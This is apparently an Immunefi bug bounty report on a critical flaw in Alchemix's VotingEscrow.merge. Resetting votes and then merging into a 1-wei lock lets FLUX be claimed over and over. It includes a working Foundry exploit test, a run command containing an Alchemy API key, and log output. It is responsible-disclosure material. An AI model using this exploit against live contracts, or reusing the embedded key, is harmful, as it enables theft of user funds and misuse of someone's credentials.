# 31198 - \[SC - Critical] VotingEscrowmerge does not check whether the \_f...

Submitted on May 14th 2024 at 20:31:50 UTC by @yttriumzz for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31198

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The `VotingEscrow.merge` interface can merge two $veToken. It checks `voted[_from]` to ensure that `_from` $veToken has not voted in the current epoch. However, this check is not comprehensive enough because the user can call `Voter.reset` to claim $FLUX without setting `voted[_from]` to `true`.

## Vulnerability Details

Please see the following code. Users can call `Voter.reset` to receive $FLUX. This interface will call `VotingEscrow.abstain` to set `voted[_tokenId]` to `false`. Moreover, the `onlyNewEpoch` modifier limits each `_tokenId` to only call the interface once per epoch. Next we use `VotingEscrow.merge` to bypass this limit.

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L183-L192
    function reset(uint256 _tokenId) public onlyNewEpoch(_tokenId) {
        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        lastVoted[_tokenId] = block.timestamp;
        _reset(_tokenId);
        IVotingEscrow(veALCX).abstain(_tokenId);
        IFluxToken(FLUX).accrueFlux(_tokenId);
    }
```

Please look at the following code. The `VotingEscrow.merge` interface can merge two $veToken into one. It only checks `voted[_from]` but not `voter.lastVoted(_from)`. In other words, we first call `Voter.reset(_from)` and then merge `_from` $veToken into another $veToken to continue receiving $FLUX.

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L618-L622
    function merge(uint256 _from, uint256 _to) external {
        require(!voted[_from], "voting in progress for token");
        require(_from != _to, "must be different tokens");
        require(_isApprovedOrOwner(msg.sender, _from), "not approved or owner");
        require(_isApprovedOrOwner(msg.sender, _to), "not approved or owner");
```

This is a brief description of the attack. Please see the PoC code for details.

1. The attacker owns $veTokenA and calls `Voter.reset` on $veTokenA. The attacker will receive $FLUX once
2. The attacker creates a new $veTokenTemp worth `1` wei of $BPT. `1` wei $BPT cost is `~0`
3. The attacker merges $veTokenA into $veTokenTemp
4. Now treat $veTokenTemp as $veTokenA and go back to the step1

Repeat the above steps to receive unlimited $FLUX

**Suggested fix**

Check whether the `_from` $veToken has voted

```diff
    function merge(uint256 _from, uint256 _to) external {
+       require((block.timestamp / DURATION) * DURATION > IVoter(voter).lastVoted(_from));
        require(!voted[_from], "voting in progress for token");
        require(_from != _to, "must be different tokens");
        require(_isApprovedOrOwner(msg.sender, _from), "not approved or owner");
        require(_isApprovedOrOwner(msg.sender, _to), "not approved or owner");
```

## Impact Details

Attackers can receive unlimited $FLUX unlimitedly

## References

None

## Proof of Concept

The PoC patch

```diff
diff --git a/src/test/VotingEscrow.t.sol b/src/test/VotingEscrow.t.sol
index 6e828a3..cfb35e6 100644
--- a/src/test/VotingEscrow.t.sol
+++ b/src/test/VotingEscrow.t.sol
@@ -1015,4 +1015,43 @@ contract VotingEscrowTest is BaseTest {
 
         hevm.stopPrank();
     }
+
+    function testYttriumzzPocTemp() public {
+        hevm.startPrank(admin);
+
+        uint256 tokenId = veALCX.createLock(1e18, 0, true);
+
+        console.log(">>>>> before steal");
+        console.log(">> IERC20(bpt).balanceOf(admin): %s", IERC20(bpt).balanceOf(admin));
+        console.log(">> flux.balanceOf(admin): %s", flux.balanceOf(admin));
+        console.log();
+
+        for (uint256 i = 0; i < 50; i++) {
+            voter.reset(tokenId);
+            flux.claimFlux(tokenId, flux.getUnclaimedFlux(tokenId));
+            uint256 tokenIdTemp = veALCX.createLock(1, 0, true);
+            veALCX.merge(tokenId, tokenIdTemp);
+            tokenId = tokenIdTemp;
+        }
+        
+        console.log(">>>>> after steal 50 times");
+        console.log(">> IERC20(bpt).balanceOf(admin): %s", IERC20(bpt).balanceOf(admin));
+        console.log(">> flux.balanceOf(admin): %s", flux.balanceOf(admin));
+        console.log();
+
+        for (uint256 i = 0; i < 100; i++) {
+            voter.reset(tokenId);
+            flux.claimFlux(tokenId, flux.getUnclaimedFlux(tokenId));
+            uint256 tokenIdTemp = veALCX.createLock(1, 0, true);
+            veALCX.merge(tokenId, tokenIdTemp);
+            tokenId = tokenIdTemp;
+        }
+        
+        console.log(">>>>> after steal 150 times");
+        console.log(">> IERC20(bpt).balanceOf(admin): %s", IERC20(bpt).balanceOf(admin));
+        console.log(">> flux.balanceOf(admin): %s", flux.balanceOf(admin));
+        console.log();
+
+        hevm.stopPrank();
+    }
 }
```

Run the PoC

```bash
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
```

The log

```bash
$ FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] testYttriumzzPocTemp() (gas: 114711590)
Logs:
  >>>>> before steal
  >> IERC20(bpt).balanceOf(admin): 99999999000000000000000000
  >> flux.balanceOf(admin): 0
  
  >>>>> after steal 50 times
  >> IERC20(bpt).balanceOf(admin): 99999998999999999999999950
  >> flux.balanceOf(admin): 49862958206078108850
  
  >>>>> after steal 150 times
  >> IERC20(bpt).balanceOf(admin): 99999998999999999999999850
  >> flux.balanceOf(admin): 149588874618234326550
  

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 417.75ms (402.92ms CPU time)

Ran 1 test suite in 1.73s (417.75ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
